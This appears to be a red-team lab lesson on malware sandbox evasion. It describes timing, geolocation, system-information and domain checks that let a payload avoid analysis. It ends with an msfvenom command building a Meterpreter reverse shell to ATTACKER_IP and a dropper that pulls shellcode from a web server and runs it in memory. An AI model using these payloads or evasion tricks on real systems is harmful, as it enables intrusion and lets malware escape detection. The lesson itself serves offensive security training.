# An Introduction to Sandbox Evasion

Now that you have a general idea of what malware sandboxes are, let's explore some high-level evasion techniques. We'll break these down into four categories. In the next task, you'll implement one technique from each category for practical experience in Red Team operations.

## Categories of Sandbox Evasion

1. **Sleeping through Sandboxes**
2. **Geolocation and Geoblocking**
3. **Checking System Information**
4. **Querying Network Information**

These are ordered from the most basic to the most advanced.

---

## 1. Sleeping through Sandboxes

Malware sandboxes often have time constraints to manage resources. You can exploit this by making your payload sleep for longer than the sandbox's analysis window (e.g., 5 minutes) before executing malicious actions. This can be done by:

- Implementing a custom sleep function (since built-in sleep functions may be patched or monitored).
- Performing compute-heavy operations (e.g., calculating the Fibonacci sequence) to delay execution.

**References:**
- [Checkpoint: Timing Evasions](https://evasions.checkpoint.com/src/Evasions/techniques/timing.html)
- [Joe Security: Bypassing Sleep Functions](https://www.joesecurity.org/blog/660946897093663167)

---

## 2. Geolocation

Sandboxes are often hosted by antivirus providers in data centers. If your payload detects it's running in an unexpected location (e.g., a different country or ISP), it can refuse to execute.

- Use services like [ifconfig.me](https://ifconfig.me) to get the current IP address.
- Use [ARIN RDAP](https://rdap.arin.net/registry/ip/1.1.1.1) to check IP ownership.

> **Note:** This method requires internet access and may be blocked by some organizations.

---

## 3. Checking System Information

Sandboxes typically have minimal resources (e.g., 1 CPU core, 4GB RAM). You can check for:

- CPU core count
- RAM amount
- Disk size
- Storage medium serial number
- PC hostname
- BIOS/UEFI version/serial
- Windows product key/OS version
- Network adapter info
- Virtualization checks
- Current signed-in user

If the system specs are suspiciously low or generic, your payload can avoid execution.

---

## 4. Querying Network Information

Most sandboxes are not joined to a domain. You can query for:

- Domain membership
- Computers
- User accounts
- Last user logins
- Groups (e.g., Domain Admins)
- Domain controllers
- Service accounts
- DNS servers

A simple check of environment variables (e.g., `LogonServer`, `LogonUserSid`, `LogonDomain`) can be effective.

---

## Setting the Stage

With an understanding of sandbox evasion methods, you'll now implement some of these techniques.

We'll start with a basic dropper that retrieves shellcode from a web server (`/index.raw`), injects it into memory, and executes it. Ensure your shellcode is:

- Generated with MSFVenom in raw format
- 64-bit (not 32-bit)

**Example:**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=1337 -f raw -o index.raw
```

Host the shellcode using Python's HTTP server:

```bash
python3 -m http.server 8080
```

> In real scenarios, you might use a C2 server, but for this lab, use the AttackBox.

The provided `dropper.cpp` has placeholder values (lines 16, 22, 24, 27, 33) you must update. Compile for a 64-bit release using Visual Studio 2019 or later.
